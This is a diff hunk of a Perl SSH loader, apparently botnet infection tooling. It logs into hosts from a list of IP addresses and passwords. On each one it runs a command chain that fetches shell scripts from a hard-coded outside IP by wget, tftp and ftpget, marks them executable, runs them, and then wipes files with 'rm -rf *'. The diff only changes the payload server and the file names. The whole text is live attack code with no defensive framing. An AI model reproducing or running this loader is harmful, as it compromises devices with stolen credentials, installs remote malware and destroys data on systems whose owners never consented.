@@ -16,7 +16,7 @@ scalar(@newarray); $i+=3) {
         if ($ssh->connect($newarray[$c])) {
                 if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                         $channel = $ssh->channel();
-                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.63.64.144/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 45.63.64.144 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 45.63.64.144; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.63.64.144 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *');
+                        $channel->exec('cd /tmp || cd /run || cd /; wget http://45.77.154.131/axisbins.sh; chmod 777 axisbins.sh; sh axisbins.sh; tftp 45.77.154.131 -c get axistftp1.sh; chmod 777 axistftp1.sh; sh axistftp1.sh; tftp -r axistftp2.sh -g 45.77.154.131; chmod 777 axistftp2.sh; sh axistftp2.sh; rm -rf axisbins.sh axistftp1.sh axistftp2.sh; rm -rf *');
                         sleep 10;
                         $channel->close;
                         print "\e[35;1mLoading [\x1b[1;32mS L U M P\x1b[1;35m] ROOT ~>: ".$newarray[$c]."\n";
